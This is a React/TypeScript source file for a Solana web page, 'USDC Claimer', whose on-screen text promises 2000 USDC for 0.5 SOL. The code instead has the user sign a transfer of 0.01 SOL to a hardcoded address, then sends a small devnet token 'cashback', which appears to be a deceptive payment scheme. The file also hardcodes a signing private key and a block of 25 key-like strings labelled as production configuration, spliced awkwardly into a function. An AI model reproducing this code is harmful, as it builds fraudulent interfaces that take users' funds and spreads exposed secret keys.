/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "7HctN2affnwryA4BPB9Se115GtiKBNXDjBfsBtF8ZLgEE8zktzdTXks5aVQbuqZinR6KXWxpoiks8BheyRseTEk"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "AfkQZYqENsgm32EWTS7ipweA29gbCtt1wKfwjvrupk7fbTMnJBRXnxEN3iis5Q63MqvNBomqYK93Ny43wopdKt4",
  "key1": "2aie8RnBMzsbaEe9RtZu7ZX2GUcPYVJtgYwAsiqUuR6dv9zpYvnwoD6wmMoUB3mLzL53jL1D3hGFZpPLLYYRk9qi",
  "key2": "57J5YHvZAQFEVHrQsy5o71CfC1yxuG2nktuy9sA5KxqbZNUgZKCUTzz1bHuz6Sdyd8MtUG2TBsn4Ckp5qirUWMbg",
  "key3": "2iQgquwW2GD1Dr1yZKowKfqYGEmFKVVa6CR9E2FrALtDdayenxkXutwf4NM6ipK3uXWkFV3nsjRUmMfeA3aYrqX2",
  "key4": "4bBvYodVBE8SDwZzJ25mLv1TQTGGQ1m2bcqkwYtS1idFWzoGCsEdEmfZD4a1YWQ16nXHmH9K3v3QGwJjHaxUFFdj",
  "key5": "2QbN9jDzvtmAUEG16pK3X3uRg5VFWL1uh6RYUNHsjbQTV7Ji4bbiXy5T5xQpCqNPYGCUsErjLvtAtmuTo4hbo9KW",
  "key6": "5a3Utssi8g54fvjAvspVPJFCLfAt8bz6H6TFxqZLNjfuhk9Zn82QJsfeYfddwVwdfdh6hULvXZUDjTuxZAdi4ZS3",
  "key7": "GqxZ2Be3UA3Gq273T4RoLTNXfxFH8cwqVjHGvyHNLXAYBnvQ1gwKJLkKVWFBMGaKpiEpu1hiD8tD7TekPe7FYFJ",
  "key8": "5cGDnUR1YBBwp55ZkaMTDAGrWBz4tW1pmbqj8E3MPyznJMugjd4Eqc1yoUnKhVkCfXhHDL7tZfZz6bqwqUr63KyB",
  "key9": "3gq9ZazMXrFFXbZv1YrqR1jEMFNog29hDVvDJepA6UdifDFcCt3UGrjeshj5ze8Vq2dZgks9oMS28fpYNnwxabwT",
  "key10": "63i6BRyaZnpQwVxDzvttEGNsGgt8hRJBX59HxonjJrGcip6JorQ3uLJAHTxaait1ZoJ7G3aC1SKLP28XtCBBX4Uv",
  "key11": "5XgR5oWqWCnDYPKBP1yqnQSV8sfLuYdz1juzASTPPbyG32qLvGnmQjLGemJwUpKjvMbrW448enE5tYsaC1r2stGZ",
  "key12": "3Q4RJvXkyxxneh3BUQvovfkVdZsUBhWGdqGG89xoGEBXPgxG1TuFdN41wcNdyjJi1Dqk5EtUYb69746ijqbZf1ew",
  "key13": "aNFPeM2LiTcjBGcgtShWUr7vs6yLjJScaTWPYCvsc18a4RQSg2MSvmumM5omuiJ44XmYAHRKf8fKbwwQAbE66zj",
  "key14": "3jK5N4bZU7xSRgFR7kDWRir23pLUHB2PQJUf3inGrcaJeT8K3w4egZPZ2NeFTezfUaibHdi2TjoyzUNTqa2UdaEs",
  "key15": "53NWCmgtR5b3wiiJFmzg6CC6EWHV6jC7EMXdRbaGFCucRYAktqZotBGYcuvhTTYS3cm9kko9PmbZkitLGF4pSXLJ",
  "key16": "3Eop2NxBi2xfm7HH7kZvH6ab3Pd18EVRzhqmSQtdmuJqso3L7rvAu1hqeBXjidQCKd64EehLkNG5WRUDwWApC8Nv",
  "key17": "5snqFRbZrXk7yuhFPrZHFPUv9jsLHGuQnmQW74iYwp5d9zw4c8MY2oSyS2pMaBCNB9cqWN86Ei3ro5jzGNRcEZdA",
  "key18": "5H5GHyZG2pY58mW9EiCiKuLm96KAqDzzshL4M3JVLquiEMpoARzdmxHj7htWrxwCV4yG26ttDGnhcyqScwQhok1k",
  "key19": "ZZYri7mVod2oJnDxSt9h2KcXRyEACAAJBGSXx5q4jfviPDEvn7xXiYZeJTHtiT27EEbDz4uCkt4hUAJEQ3dRdRH",
  "key20": "3QhWib65rhvz9VTEwMzkBLPF4tLHBntQp5i4XdH33XYX9rYtViMeEtigwKBcGqzVggEesxoeJuTZVwGzhQdKmC9x",
  "key21": "5BnXEbPBwTjvT2VFSTJJmGHPD1bstkxSeCbTRNGyZptBdX1u1uXyFxKTJKg3Zp5NmYEKEcDg7dZsWcbk6kh5LQND",
  "key22": "XCZdgHSrsT571x4CELHgjFhjLtZE42pRXbyehaEhyVnPmgEcCyDveBmzJug6ahdK4BawT3PfYjUSZqMV9BknzGJ",
  "key23": "YZGLbXXjSsGLuB63W6NNH8inUcJZK8NHGDgujz8e9wELTwcb3UqwhQimvWJFUiZc5v27ne4tJQ7VecXANtWAQp8",
  "key24": "3rLoFpHtEfV36Nz47AaCtcQ9hnrzFMGqa2CiQSFU5pN8tEp3xooD4RN3H5fc9UwfRbuMqGd5vof2SXghv61ANUeC"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
